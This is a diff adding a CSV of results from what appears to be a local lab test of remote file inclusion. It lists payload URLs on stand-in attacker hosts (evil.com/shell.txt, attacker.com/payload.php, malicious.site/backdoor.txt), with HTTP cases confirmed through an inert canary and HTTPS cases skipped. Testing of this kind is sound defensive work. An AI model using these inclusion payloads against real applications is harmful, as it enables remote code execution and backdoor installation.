@@ -1,0 +1,19 @@
+﻿Category,Mode,Index,Payload,Scheme,Status,Outcome,Confirmed,Evidence,Error,TestedUtc
+Remote File Inclusion,Basic,1,http://malicious.site/backdoor.txt,http,200,LOCAL_RFI_CANARY_CONFIRMED,True,inert_local_canary_marker_in_response,,2026-10-11T09:26:28.036656+00:00
+Remote File Inclusion,Basic,5,http://evil.com/shell.txt,http,200,LOCAL_RFI_CANARY_CONFIRMED,True,inert_local_canary_marker_in_response,,2026-10-11T09:26:28.243889+00:00
+Remote File Inclusion,Basic,6,http://attacker.com/payload.php,http,200,LOCAL_RFI_CANARY_CONFIRMED,True,inert_local_canary_marker_in_response,,2026-10-11T09:26:28.419269+00:00
+Remote File Inclusion,Advanced,3,http://malicious.site/backdoor.txt,http,200,LOCAL_RFI_CANARY_CONFIRMED,True,inert_local_canary_marker_in_response,,2026-10-11T09:26:28.544717+00:00
+Remote File Inclusion,Advanced,4,http://attacker.com/payload.php,http,200,LOCAL_RFI_CANARY_CONFIRMED,True,inert_local_canary_marker_in_response,,2026-10-11T09:26:28.670348+00:00
+Remote File Inclusion,Advanced,6,http://evil.com/shell.txt,http,200,LOCAL_RFI_CANARY_CONFIRMED,True,inert_local_canary_marker_in_response,,2026-10-11T09:26:28.782268+00:00
+Remote File Inclusion,Evasion,2,http://attacker.com/payload.php,http,200,LOCAL_RFI_CANARY_CONFIRMED,True,inert_local_canary_marker_in_response,,2026-10-11T09:26:28.900155+00:00
+Remote File Inclusion,Evasion,3,http://malicious.site/backdoor.txt,http,200,LOCAL_RFI_CANARY_CONFIRMED,True,inert_local_canary_marker_in_response,,2026-10-11T09:26:29.025615+00:00
+Remote File Inclusion,Evasion,4,http://evil.com/shell.txt,http,200,LOCAL_RFI_CANARY_CONFIRMED,True,inert_local_canary_marker_in_response,,2026-10-11T09:26:29.144538+00:00
+Remote File Inclusion,Basic,2,https://attacker.com/payload.php,https,SKIPPED,HTTPS_NOT_TESTED_LOCAL_TLS_UNAVAILABLE,False,No HTTPS endpoint configured in local lab,,2026-10-11T09:26:29.896950+00:00
+Remote File Inclusion,Basic,3,https://malicious.site/backdoor.txt,https,SKIPPED,HTTPS_NOT_TESTED_LOCAL_TLS_UNAVAILABLE,False,No HTTPS endpoint configured in local lab,,2026-10-11T09:26:29.896950+00:00
+Remote File Inclusion,Basic,4,https://evil.com/shell.txt,https,SKIPPED,HTTPS_NOT_TESTED_LOCAL_TLS_UNAVAILABLE,False,No HTTPS endpoint configured in local lab,,2026-10-11T09:26:29.896950+00:00
+Remote File Inclusion,Advanced,1,https://malicious.site/backdoor.txt,https,SKIPPED,HTTPS_NOT_TESTED_LOCAL_TLS_UNAVAILABLE,False,No HTTPS endpoint configured in local lab,,2026-10-11T09:26:29.896950+00:00
+Remote File Inclusion,Advanced,2,https://evil.com/shell.txt,https,SKIPPED,HTTPS_NOT_TESTED_LOCAL_TLS_UNAVAILABLE,False,No HTTPS endpoint configured in local lab,,2026-10-11T09:26:29.896950+00:00
+Remote File Inclusion,Advanced,5,https://attacker.com/payload.php,https,SKIPPED,HTTPS_NOT_TESTED_LOCAL_TLS_UNAVAILABLE,False,No HTTPS endpoint configured in local lab,,2026-10-11T09:26:29.896950+00:00
+Remote File Inclusion,Evasion,1,https://attacker.com/payload.php,https,SKIPPED,HTTPS_NOT_TESTED_LOCAL_TLS_UNAVAILABLE,False,No HTTPS endpoint configured in local lab,,2026-10-11T09:26:29.896950+00:00
+Remote File Inclusion,Evasion,5,https://evil.com/shell.txt,https,SKIPPED,HTTPS_NOT_TESTED_LOCAL_TLS_UNAVAILABLE,False,No HTTPS endpoint configured in local lab,,2026-10-11T09:26:29.896950+00:00
+Remote File Inclusion,Evasion,6,https://malicious.site/backdoor.txt,https,SKIPPED,HTTPS_NOT_TESTED_LOCAL_TLS_UNAVAILABLE,False,No HTTPS endpoint configured in local lab,,2026-10-11T09:26:29.896950+00:00
